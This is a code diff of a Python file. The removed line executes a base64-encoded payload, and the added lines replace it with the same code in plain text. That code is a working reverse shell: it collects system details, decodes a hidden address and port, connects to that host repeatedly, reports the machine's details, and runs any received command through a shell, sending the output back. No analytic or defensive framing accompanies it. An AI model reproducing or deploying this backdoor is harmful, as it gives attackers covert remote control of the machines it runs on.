@@ -1,3 +1,54 @@
-
+#!/usr/bin/python
 import base64
-exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IGJhc2U2NAppbXBvcnQgc29ja2V0LHN1YnByb2Nlc3MsdGltZSxvcwphcmNoID0gb3MucG9wZW4oImFyY2giKS5yZWFkKCkKaWYgYXJjaCA9PSAnJzoKIGFyY2ggPSAieCIKaW5mbyA9IG9zLnBvcGVuKCJ1bmFtZSAtYSIpLnJlYWQoKQppZiBpbmZvID09ICcnOgogaW5mbyA9ICJ4IgoKYSA9IGIiTVRreUxqRTJPQzR3TGpFeE5BPT0iCmIgPSBiIk5EQXdNQT09IgpjID0gYmFzZTY0LmI2NGRlY29kZShhKS5kZWNvZGUoKQpkID0gaW50KGJhc2U2NC5iNjRkZWNvZGUoYikuZGVjb2RlKCkpCgp3aGlsZSBUcnVlOgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KCBzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHMuc2V0dGltZW91dCg1LjApCiAgICAgICAgeCA9IHMuZ2V0c29ja29wdCggc29ja2V0LlNPTF9TT0NLRVQsIHNvY2tldC5TT19LRUVQQUxJVkUpCiAgICAgICAgaWYoIHggPT0gMCk6CiAgICAgICAgICAgIHggPSBzLnNldHNvY2tvcHQoIHNvY2tldC5TT0xfU09DS0VULCBzb2NrZXQuU09fS0VFUEFMSVZFLCAxKQogICAgICAgIHRyeToKICAgICAgICAgICAgaXBmID0gc29ja2V0LmdldGhvc3RieW5hbWUoYykKICAgICAgICAgICAgcy5jb25uZWN0KChpcGYsZCkpCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgdGltZS5zbGVlcCggMTApCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgc2VnPSgneCcrJ3wnKycxLjEuNScrJ3wnKyd4JysnfCcrc3RyKGFyY2gpKyd8JytzdHIoaW5mbykrJ3xMaXg4cScpLmVuY29kZSgndXRmLTgnKQogICAgICAgIHMuc2VuZChzZWcpCiAgICAgICAgd2hpbGUgMToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZGF0YTEgPSBzLnJlY3YoMTAyNCkKICAgICAgICAgICAgICAgIGRhdGEgPSBkYXRhMS5kZWNvZGUoInV0Zi04IikKICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhcnRzd2l0aCgnWmVYcm8wJyk9PVRydWU6CiAgICAgICAgICAgICAgICAgICAgZGF0YSA9ICgnJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKQogICAgICAgICAgICAgICAgICAgIHU9KGInJykKICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgICAgICAgbGluZSA9IHByb2Muc3Rkb3V0LnJlYWRsaW5lKCkKICAgICAgICAgICAgICAgICAgICAgIHUrPWxpbmUgKyAoYiJ8IikKICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUgPT0gKGInJyk6ICAKICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIHMuc2VuZChieXRlcyh1KSkKICAgICAgICAgICAgICAgICAgICBzLnNlbmQoYiJCb1hlciIpICAgICAgICAgICAgIAogICAgICAgICAgICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6CiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDApCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgIHRyeToKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCg==").decode())
+import socket,subprocess,time,os
+arch = os.popen("arch").read()
+if arch == '':
+ arch = "x"
+info = os.popen("uname -a").read()
+if info == '':
+ info = "x"
+
+a = b"MTkyLjE2OC4wLjExNA=="
+b = b"NDAwMA=="
+c = base64.b64decode(a).decode()
+d = int(base64.b64decode(b).decode())
+
+while True:
+        s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
+        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
+        if( x == 0):
+            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        try:
+            ipf = socket.gethostbyname(c)
+            s.connect((ipf,d))
+        except socket.error:
+            time.sleep( 10)
+            continue
+        seg=('x'+'|'+'1.1.5'+'|'+'x'+'|'+str(arch)+'|'+str(info)+'|Lix8q').encode('utf-8')
+        s.send(seg)
+        while 1:
+            try:
+                data1 = s.recv(1024)
+                data = data1.decode("utf-8")
+                if data.startswith('ZeXro0')==True:
+                    data = ('')
+                else:
+                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    u=(b'')
+                    while True:
+                      line = proc.stdout.readline()
+                      u+=line + (b"|")
+                      if line == (b''):  
+                          break
+                    s.send(bytes(u))
+                    s.send(b"BoXer")             
+            except socket.timeout:
+                time.sleep(0)
+                continue
+            except:
+                break
+        try:
+            s.close()
+        except:
+            pass
